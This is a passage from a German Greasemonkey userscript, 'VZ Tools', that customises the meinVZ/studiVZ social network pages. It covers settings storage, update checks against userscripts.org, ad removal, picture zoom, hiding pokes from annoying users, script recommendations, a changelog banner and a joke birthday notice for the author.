    GM_setValue(s_prefix + 'add_logout',1);
  }else{
    GM_setValue(s_prefix + 'add_logout',0);
  }
  if (document.getElementById('vt_f_show_guestbook').checked) {
    GM_setValue(s_prefix + 'f_guestbook',1);
  }else{
    GM_setValue(s_prefix + 'f_guestbook',0);
  }
  if (document.getElementById('vt_f_show_gb_last_author').checked) {
    GM_setValue(s_prefix + 'f_gb_last_author',1);
  }else{
    GM_setValue(s_prefix + 'f_gb_last_author',0);
  }
  if (document.getElementById('vt_f_show_pictures').checked) {
    GM_setValue(s_prefix + 'f_pictures',1);
  }else{
    GM_setValue(s_prefix + 'f_pictures',0);
  }
  if (document.getElementById('vt_f_show_webslice').checked) {
    GM_setValue(s_prefix + 'show_webslice',1);
  }else{
    GM_setValue(s_prefix + 'show_webslice',0);
  }
  if (document.getElementById('vt_f_pin_menu').checked) {
    GM_setValue(s_prefix + 'pin_menu',1);
  }else{
    GM_setValue(s_prefix + 'pin_menu',0);
  }
  if (document.getElementById('vt_f_bookmark_tabs').checked) {
    GM_setValue(s_prefix + 'bookmark_tabs',1);
  }else{
    GM_setValue(s_prefix + 'bookmark_tabs',0);
  }
  if (document.getElementById('vt_f_fix_backlinks').checked) {
    GM_setValue(s_prefix + 'fix_backlinks',1);
  }else{
    GM_setValue(s_prefix + 'fix_backlinks',0);
  }
  /*
  if (document.getElementById('vt_f_wide_vz').checked) {
    GM_setValue(s_prefix + 'wide_vz',1);
  }else{
    GM_setValue(s_prefix + 'wide_vz',0);
  }
  */
  if (document.getElementById('vt_f_add_share').checked) {
    GM_setValue(s_prefix + 'add_share',1);
  }else{
    GM_setValue(s_prefix + 'add_share',0);
  }
  if (document.getElementById('vt_f_zoom_pics').checked) {
    GM_setValue(s_prefix + 'zoom_pics',1);
  }else{
    GM_setValue(s_prefix + 'zoom_pics',0);
  }
  if (document.getElementById('vt_f_toggle_gruschel').checked) {
    GM_setValue(s_prefix + 'toggle_gruschel',1);
  }else{
    GM_setValue(s_prefix + 'toggle_gruschel',0);
  }
  if (document.getElementById('vt_f_nerv_gruschel').checked) {
    GM_setValue(s_prefix + 'nerv_gruschel',1);
  }else{
    GM_setValue(s_prefix + 'nerv_gruschel',0);
  }
  if (document.getElementById('vt_f_hide_election').checked) {
    GM_setValue(s_prefix + 'hide_election',1);
  }else{
    GM_setValue(s_prefix + 'hide_election',0);
  }
  if (document.getElementById('vt_f_enable_groups').checked) {
    GM_setValue(s_prefix + 'enable_groups',1);
  }else{
    GM_setValue(s_prefix + 'enable_groups',0);
  }
  if (document.getElementById('vt_f_hide_policy').checked) {
    GM_setValue(s_prefix + 'hide_policy',1);
  }else{
    GM_setValue(s_prefix + 'hide_policy',0);
  }
  if (document.getElementById('vt_f_hide_sms').checked) {
    GM_setValue(s_prefix + 'hide_sms',1);
  }else{
    GM_setValue(s_prefix + 'hide_sms',0);
  }
  GM_setValue(s_prefix + 'f_refresh', document.getElementById('vt_f_refresh').value);
  cdialog.close();
  window.location.reload();
}

// Automatische Updates
function updateScript() {
  var nocache = Date.now();
  GM_xmlhttpRequest({
   method:"GET",
   url: "http://userscripts.org/scripts/source/38483.meta.js?nocache="+nocache,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     last_update = trim(response.responseText.split('@version')[1].split('//')[0]);
     if (confirm("Die neueste Version stammt vom "+last_update+". Du besitzt die Version vom "+version+".\nMöchtest Du zur Userscripts-Projektseite wechseln?")) {
       window.open("http://userscripts.org/scripts/show/38483","","");
     }
   }
	 });
}

var global_update;

// Update-Benachrichtigung anzeigen
function displayUpdateAlert() {
  if (version != GM_getValue('last_update',version)) {
    global_update = GM_getValue('last_update',version);
    var insert = document.getElementById("Grid-Page-Left");
    var update_message = document.createElement('div');
    update_message.setAttribute('class','update');
    update_message.innerHTML += "<b>Ein Update für VZ Tools ist verfügbar!</b><br /><br />"+
      "Deine Version: "+version+"<br /><b>Neue Version: "+global_update+"</b><br /><br />" + 
			"<center><a href='http://userscripts.org/scripts/source/38483.user.js' id='go_update'>[updaten]</a><br /><br /><a href='http://userscripts.org/scripts/show/38483' target='_blank' id='go_update'>[was ist neu?]</a></center>";
    addGlobalStyle('.update {width: 110px;  margin-top: 10px; padding: 5px; background-color: #FFA0A0; color: #FFFFFF; border: 1px solid #FF0000;}');
    addGlobalStyle('.update a {color: #FFFFFF; font-weight: bold;}');
    insert.wrappedJSObject.appendChild(update_message);
  }
}

// Auf Updates überprüfen
function checkForUpdates() {
   var nocache = Date.now();
   if ((window.location.href.indexOf('Start') == -1)) {
     displayUpdateAlert();
     return false;
   }
   
   GM_xmlhttpRequest({
   method:"GET",
   url: "http://userscripts.org/scripts/source/38483.meta.js?nocache="+nocache,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     last_update = trim(response.responseText.split('@version')[1].split('//')[0]);
     global_update = last_update;
     GM_setValue('last_update',last_update);
     displayUpdateAlert();
   }
	 });
}

GM_registerMenuCommand('VZ Tools - Einstellungen', showConfigDialog);

// == ENDE Konfiguration ==

// == BEGINN Scherz ==

showHenningsBirthday = function() {
  var heute = new Date();
  if (heute.getDate() != 31) {
    return false;
  }
  if (heute.getMonth() != 6) {
    return false;
  }

  var field = document.getElementById('toppageinsert');
  var birthday = document.createElement('div');
  birthday.setAttribute('style','padding: 5px; background-color: #ffff80; height: 110px; border: 1px dashed #c0c000');
  var content =  '<img align="left" style="margin-right: 10px;" src="http://www.hotel-villa-rosengarten.de/uploads/pics/geburtstag.png" height="100" />';
      content += '<b>Der Autor von VZ Tools hat heute Geburtstag!</b><br /><br />';
      content += 'Und er würde sich sicherlich über einen Gruß freuen :) Bitte wähle aus, was Du tun möchtest. Und keine Sorge: Morgen ist dieser Hinweis wieder weg.<br /><br />';
      content += '<a href="/Gruscheln/DialogGruscheln/e4ebb3181353c6ef" id="bd_gruscheln">[Gruscheln]</a> <a href="/Pinboard/e4ebb3181353c6ef" id="bd_pinnwand">[Pinnwandeintrag]</a> <a href="http://www.meinvz.net/Messages/WriteMessage/e4ebb3181353c6ef" id="bd_message">[Nachricht]</a> <a href="#" id="bd_gift">[Geschenk auswählen]</a>';
  birthday.innerHTML = content;
  field.appendChild(birthday);
  document.getElementById('bd_gift').addEventListener("click", function () {
    var overlay = document.createElement('div');
    overlay.setAttribute('style','position: absolute; top: 100px; left: 20%; right: 20%; z-index: 65535; height: 430px; background-color: #FFFFFF; border: 3px solid '+color1+'; -moz-box-shadow: #808080 5px 5px 5px;');
    var content = '<center><h2>Na, was möchtest Du mir denn schenken?</h2><br /><br />';
       content += "Hier eine Auswahl an kleinen, preiswerten Geschenken, über die ich mich freuen würde:<br /><br />";
       content += "<img src='http://www.photos.a-vsp.com/fotodb/43_free_photo_yacht.jpg' width='200'>&nbsp;";
       content += "<img src='http://www.vistawallpaper.com/data/media/11/Bugatti_Veyron_2405.jpg' width='200'><br />";
       content += "<img src='http://www.tsv-sub.de/urlaub/sipadan/Insel.jpg' width='200'>&nbsp;";
       content += "<img src='http://www.aerospace-technology.com/projects/learjet_31a/images/Learjet31A_1.jpg.jpg' width='200' height='139'><br /><br />";
       content += "<a href='javascript:window.location.reload()'>[Nein, doch lieber nicht!]</a>";
       content += '</center>';
    overlay.innerHTML = content;
    document.body.appendChild(overlay);
  }, false);
}

// == BEGINN Main ==

// Globaler Eventlistener
window.addEventListener("load", function() {
   // Auf Updates prüfen
   checkForUpdates();
   // Bilder vergrößern
   if (GM_getValue(s_prefix + 'zoom_pics', 0) == 1) {
     initEnlargePics();
   }
   // Bannerwerbung weg
   if (GM_getValue(s_prefix + 'hide_banners', 1) == 1) {
     removeMainAds();
   }
   // Bilder abspeichern ermöglichen
   if (GM_getValue(s_prefix + 'allow_savepics', 1) == 1) {
     allowSavePics();
   }
   // Einladungen überall entfernen
   if (GM_getValue(s_prefix + 'hide_invitation_everywhere', 0) == 1) {
     addGlobalStyle('#Grid-Page-Left #mod-invitation-invitationbox { display: none !important;}');
   }
   // KKADLS
   if (GM_getValue(s_prefix + 'hide_kkadls', 0) == 1) {
     addGlobalStyle('#LeftsideBox { display: none !important;}');
   }
  // Zusätzlichen Logout-Link
  if (GM_getValue(s_prefix + 'add_logout', 0) == 1) {
     additionalLogoutLink();
   }
  // Konfigurations-Toolbar
  displayConfigIcons();
  // Bookmarks und Notizen verwenden
   if (GM_getValue(s_prefix + 'use_bookmarks', 1) == 1) {
     addNotes();
     addBookmarks();
   }
  // Überblick
  if (GM_getValue(s_prefix + 'u_position', 0) != 1) {
    if (window.location.href.indexOf('Start') < 1) {
      displayNewOverview(GM_getValue(s_prefix + 'u_position', 0));
      getNumberOfFriends(false);
      getNumberOfFriends(true);
	  } 
  }
  if (GM_getValue(s_prefix + 'enable_groups', 1) == 1) {
    showUnreadGroups();
    visitGroup();
  }
  // Einladungen auf Freundes-Seite
  if (GM_getValue(s_prefix + 'hide_invitation_everywhere', 0) == 1) {
    addGlobalStyle('.obj-invitation-box { display: none !important;}');
  }
  if (window.location.href.indexOf('Start') > 0) {
    // Benachrichtungen
      showAlerts();
    // Freundes-Überblick
    if (GM_getValue(s_prefix + 'f_details',1) == 1) {
      showFriendsOverview();
      getFriendsDetailsRecursive(1);
    }
    // Freundes-Überblick aktualisieren
    if (GM_getValue(s_prefix + 'f_refresh',0) > 30000) {
      window.setInterval(refreshFriends, GM_getValue(s_prefix + 'f_refresh',60000));
    }
    // Anzahl der Pinnwandeinträge etc.
    if (GM_getValue(s_prefix + 'u_position', 0) != 1) {
      displayNewOverview(GM_getValue(s_prefix + 'u_position', 0));
    }
    // Spalten ausblenden
    hideColumns();
    if (GM_getValue(s_prefix + 'swap_visitors', 0) == 1) {
      swapVisitors();
    }
    // Notizen auf der Startseite anzeigen
    if (GM_getValue(s_prefix + 'show_bookmarks', 0) == 1) {
      showBookmarksAndNotes();
    }
    // Webslice anzeigen
    if (GM_getValue(s_prefix + 'show_webslice', 0) == 1) {
      showWebSlice();
    }
    // Gruscheln zusammenfassen
    if (GM_getValue(s_prefix + 'toggle_gruschel', 0) == 1) {
      enableToggleGruschel();
    }
    // Nervige Gruschler
    if (GM_getValue(s_prefix + 'nerv_gruschel', 1) == 1) {
      removeAnnoyingGruschel();
    }
    // Menü pinnen
    if (GM_getValue(s_prefix + 'pin_menu', 1) == 1) {
      addGlobalStyle('#Grid-Page-Left {position: fixed !important;');
    }
    // Skript-Empfehlungen
    window.setTimeout(checkForRecommendations, 1000);
    // Changelog
    showChangelog();
    // DEBUG: Hennings Geburtstag
      showHenningsBirthday();
  }
},true);

// Gästebucheinträge zählen
if (((window.location.href.indexOf('Profile') > 0) || (window.location.href.indexOf('Pinboard') > 0)) && (window.location.href.indexOf(profId) > 0)) {
  getNumberOfGuestbook(true);
}

// Bildverlinkungen zählen
if ((window.location.href.indexOf('Tags') > 0) && (window.location.href.indexOf(profId) > 0)) {
  getNumberOfPictures(true);
}

// Zurück-Button fixen
if (GM_getValue(s_prefix + '_fix_backlinks', 1) == 1) {
  if (document.getElementsByClassName('link-face-button')) {
    var list = document.getElementsByClassName('link-face-button');
    for (var i = 0; i < list.length; i++) {
      if ((list[i].innerHTML == 'zurück') || (list[i].innerHTML == 'Zurück')) {
        list[i].setAttribute('href', GM_getValue(s_prefix + '_backurl', "/Start"));
      }
    }
  }
  // zuletzt aufgerufene Seite speichern
  if ((window.location.href.indexOf('Gruscheln') == -1) && (window.location.href.indexOf('NewThread') == -1)) {
    if (window.location.href.indexOf('WriteMessage') == -1) {
      GM_setValue(s_prefix + '_backurl', window.location.href);
    }
  }
}

// WideVZ
if (GM_getValue(s_prefix + 'wide_vz', 0) == 1) {
  var width = window.innerWidth;
  var usablewidth = width - 40;
  var innerwidth = usablewidth - 300;
  addGlobalStyle('#Grid-Wrapper {width: '+usablewidth+'px !important}');
  addGlobalStyle('#Grid-Page {width: '+usablewidth+'px !important}');
  addGlobalStyle('#Grid-Page-Center {width: '+(usablewidth - 135)+'px !important;}');
  addGlobalStyle('#Grid-Page-Center-Content {width: '+(usablewidth - 135)+'px !important;}');
  addGlobalStyle('#Grid-Page-Center-Top {width: '+(usablewidth - 133)+'px !important;}');
  addGlobalStyle('#Grid-Page-Center-Header {width: '+(usablewidth - 155)+'px !important;}');
  addGlobalStyle('#Grid-Page-Center-Footer {width: '+(usablewidth - 153)+'px !important;}');
  addGlobalStyle('#startLeft {width: '+innerwidth+'px !important;}');
  addGlobalStyle('#startLeft div {width: '+innerwidth+'px !important;}');
}

// "Funktioniert nicht mehr" ausblenden
if (doesnotwork) {
  doesnotwork.style.display = 'none';
}


// Bilder vergrößern

function findPos(obj) {
	var curleft = curtop = 0;
  if (obj.offsetParent) {
    do {
			curleft += obj.offsetLeft;
			curtop += obj.offsetTop;
    } while (obj = obj.offsetParent);
  }
	return [curleft,curtop];
}

showLargePic = function(evt) {
  var src = evt.target.src;
  var nsrc = src.replace(/-m.jpg/,".jpg");
      nsrc = nsrc.replace(/-s.jpg/,".jpg");
  if (src != nsrc) {
    imgviewer.src = nsrc;
    imgviewer.addEventListener("load", function() {
      imgviewer.style.top = (findPos(evt.target)[1] - (imgviewer.height / 2) + (evt.target.height / 2)) + 'px';
      imgviewer.style.left = (findPos(evt.target)[0] - (imgviewer.width / 2) + (evt.target.width / 2)) + 'px';
      imgviewer.style.display = 'block';
    }, true);
  }
}

var imgviewer;

function initEnlargePics() {
	imgviewer = document.createElement('img');
	imgviewer.style.display = 'none';
	imgviewer.style.position = 'absolute';
	imgviewer.style.zIndex = '20000';
	imgviewer.addEventListener("mouseout", function() { this.style.display = 'none'; }, true);
	document.body.appendChild(imgviewer);
	
	var list = document.getElementsByTagName('img');
	for (var i = 0; i < list.length; i++) {
	  if (list[i].src.indexOf('profile') > -1) {
	    list[i].addEventListener("mouseover", showLargePic, true);
	  }
	}
}

// Gruscheln zusammenfassen

var ghideall;

function enableToggleGruschel() {
  var count = 0;
  if (!document.getElementById('Gruscheln_Overview')) {
    return false;
  }
  var gruschelList = document.getElementById('Gruscheln_Overview').getElementsByTagName('ul')[0];
  var container = document.getElementById('Gruscheln_Overview').getElementsByClassName('text')[0];
  var links = container.getElementsByClassName('text-right');
  ghideall = links[links.length - 1];
  ghideall.innerHTML += '<br /><a href="#" id="remgruschel">[zusammenfassen]</a>';
  gruschelList.style.display = 'none';
  ghideall.style.display = 'none';
  var insert = document.createElement('div');
  insert.setAttribute('id', 'shortgruschel');
  var content = "Du wurdest gegruschelt von ";
  var names = document.getElementById('Gruscheln_Overview').getElementsByClassName('fullname');
  for (var i = 0; i < names.length; i++) {
    var id = names[i].href.split('/')[4];
    if ((GM_getValue(s_prefix + 'nerv_gruschel', 1) == 1) && GM_getValue(s_prefix + 'agruschel_'+id, 0) == 1) {
      count++;
    }else{
      content += "<a href='"+names[i].href+"'>"+names[i].innerHTML+"</a>";
      if ((i + 2) < names.length) {
        content += ", ";
      }else if((i + 1) < names.length){
        if (count > 0) {
          content += ", ";
        }else{
          content += " und ";
        }
      }
    }
  }
  if (count > 0) {
    content += " und "+count+" Nervensägen.";
  }
  content += "<br /><br /><div class='text-right'><a href='#' id='togglegruschel'>[anzeigen/zurückgruscheln]</a></div>";
  insert.innerHTML = content;
  container.appendChild(insert);
  document.getElementById('togglegruschel').addEventListener("click", toggleGruschel, true);
  document.getElementById('remgruschel').addEventListener("click", shortGruschel, true);
}

toggleGruschel = function() {
  var gruschelList = document.getElementById('Gruscheln_Overview').getElementsByTagName('ul')[0];
  var shortgruschel = document.getElementById('shortgruschel');
  shortgruschel.style.display = 'none';
  gruschelList.style.display = 'block';
  ghideall.style.display = 'block';
}

shortGruschel = function() {
  var gruschelList = document.getElementById('Gruscheln_Overview').getElementsByTagName('ul')[0];
  var shortgruschel = document.getElementById('shortgruschel');
  gruschelList.style.display = 'none';
  ghideall.style.display = 'none';
  shortgruschel.style.display = 'block';
}

// Nervige Gruschler ausblenden

function removeAnnoyingGruschel() {
  var count = 0;
  var gruschler = document.getElementById('Gruscheln_Overview').getElementsByTagName('ul')[0].getElementsByTagName('li');
  // Links hinzufügen
  for (var i = 0; i < gruschler.length; i++) {
    var link = gruschler[i].getElementsByClassName('fullname')[0];
    var id = link.href.split('/')[4];
    var span = document.createElement('span');
    span.innerHTML = '<br /><a href="#" agid="'+id+'" id="nerv'+id+'>[Du nervst]</a>';
    gruschler[i].getElementsByClassName('text-right')[0].appendChild(span);
    document.getElementById('nerv'+id).addEventListener('click', markAsAnnoying, true);
    if (GM_getValue(s_prefix + 'agruschel_'+id, 0) == 1) {
      gruschler[i].style.display = 'none';
      count++;
    }
  }
  if (count > 0) {
    var nervensaegen = document.createElement('li');
    nervensaegen.innerHTML = '<div class="float-left"><b>'+count+' Gruschler von Nervensägen werden nicht angezeigt.</b></div><div class="text-right"><a href="#" id="resetnerv">[zurücksetzen]</a>';
    document.getElementById('Gruscheln_Overview').getElementsByTagName('ul')[0].appendChild(nervensaegen);
    document.getElementById('resetnerv').addEventListener('click', resetAnnoyingGruschel, true);
  }
}

resetAnnoyingGruschel = function() {
  var list = GM_listValues();
  for (var i = 0; i < list.length; i++) {
    if (list[i].indexOf('agruschel_') > -1) {
      GM_deleteValue(list[i]);
    }
  }
  window.location.reload();
}

markAsAnnoying = function(evt) {
  var id = evt.target.getAttribute('agid');
  GM_setValue(s_prefix + 'agruschel_'+id, 1);
  evt.target.parentNode.parentNode.parentNode.style.display = 'none';
}

// Chatroom
// var div = document.createElement('div');
// div.innerHTML = '<div style="width:210px"><style>.mcrmeebo { display: block; background:url("http://widget.meebo.com/r.gif") no-repeat top right; } .mcrmeebo:hover { background:url("http://widget.meebo.com/ro.gif") no-repeat top right; } </style><object width="210" height="350"><param name="movie" value="http://widget.meebo.com/mcr.swf?id=eULbBiYksb"></param><embed src="http://widget.meebo.com/mcr.swf?id=eULbBiYksb" type="application/x-shockwave-flash" width="210" height="350" /></object><a target="_BLANK" href="http://www.meebo.com/rooms/" class="mcrmeebo"><img alt="Create a Meebo Chat Room" src="http://widget.meebo.com/b.gif" width="210" height="45" style="border:0px"/></a></div>';
// document.body.appendChild(div);

// == Beginn Empfehlungen ==

var recommendationVersion = 1;
checkForRecommendations = function() {
  if (GM_getValue(s_prefix + 'recommendations', 0) == recommendationVersion) {
    return false;
  }
  var show = false;
  var field = document.getElementById('toppageinsert');
  var recommend = document.createElement('div');
  recommend.setAttribute('id','recdiv');
  recommend.setAttribute('style','padding: 5px; background-color: #ffff80; border: 1px dashed #c0c000');
  var content  = "<b>Ein kleiner Tipp am Rande:</b><br /><br />";
      content += "<small>Auf userscripts.org gibt es noch weitere Skripte von anderen Autoren, die die Funktionalität von VZ Tools optimal ergänzen und zu VZ Tools kompatibel sind. ";
      content += "Hier möchten wir Dir einige dieser Skripte, die bei Dir nicht erkannt werden konnten, vorstellen. Vielleicht möchtest Du Dir diese ja einmal näher ansehen:<br /><br /><ul>";
      if (!document.getElementById('msg_widget')) {
        content += "<li><small><b><a href='http://userscripts.org/scripts/show/13754' target='_blank'>SVZ Sidebar</a> von lazka</b>: Immer sehen, welche Freunde online sind (studi/mein/schüler)</small></li>";
        show = true;
      }
      content += "<li><small><b><a href='http://userscripts.org/scripts/show/22186' target='_blank'>Fotoalbum Download</a> von Schirkan</b>: Einfach ganze Alben speichern (studi/mein/schüler)</small></li>";
      if ((document.getElementById('Feeds-Buttons')) && (document.getElementById('Feeds-Buttons').getElementsByClassName('button')[0].value.indexOf('twitter') == -1)) {
        content += "<li><small><b><a href='http://userscripts.org/scripts/show/48406' target='_blank'>Buschfunk to Twitter</a> von Jakob Dorn</b>: Buschfunk zu Twitter senden (studi/mein/schüler)</small></li>";
        show = true;
      }
      content += "</ul></small>";
      content += "<br /><center><a href='#' id='hide_recommendations'>[Nein, danke]</a></center>";
  recommend.innerHTML = content;
  if (show) {
    field.appendChild(recommend);
    document.getElementById('hide_recommendations').addEventListener("click", function() {
      GM_setValue(s_prefix + 'recommendations', recommendationVersion);
      document.getElementById('recdiv').style.display = 'none';
    }, false);
  }
}

// Changelog

showChangelog = function() {
  if ((GM_getValue(s_prefix + 'changelog', 0) == version) && (GM_getValue(s_prefix + '_support_invite', 0) != 0)) {
    return false;
  }
  var field = document.getElementById('toppageinsert');
  var changelogd = document.createElement('div');
  changelogd.setAttribute('id','changelogdiv');
  changelogd.setAttribute('style','padding: 5px; background-color: #ffff80; border: 1px dashed #c0c000');
  var content  = "<b>Neu in Version "+version+" der VZ Tools:</b><br /><br />";
      content += changelog;
      content += "<br /><center><a href='#' id='hide_changelog'>[Ausblenden]</a></center>";
  changelogd.innerHTML = content;
  field.appendChild(changelogd);
  document.getElementById('hide_changelog').addEventListener("click", function() {
      GM_setValue(s_prefix + 'changelog', version);
      document.getElementById('changelogdiv').style.display = 'none';
    }, false);
}

// Einstellungs-Dialog

addGlobalStyle('.dialog-wrapper h2 {margin-top: 2px; margin-bottom: 2px;}');


GM_registerMenuCommand('Konfiguration ausgeben', exportConfig);

// == ENDE Main ==

// == BEGINN Testfunktionen ==

//GM_registerMenuCommand('Freundesliste exportieren', exportFriends);
//GM_registerMenuCommand('Defekte Notizen löschen', removeEmptyNotes);
//GM_registerMenuCommand('Freundes-Statistik zurücksetzen', resetFriends);
//GM_registerMenuCommand('Test Anzahl Freunde', function() { GM_setValue(s_prefix + 'friendscount', 100);});
//GM_registerMenuCommand('Test Gespeicherte Freunde', function() { alert(GM_getValue(s_prefix + 'friendslist', ''));});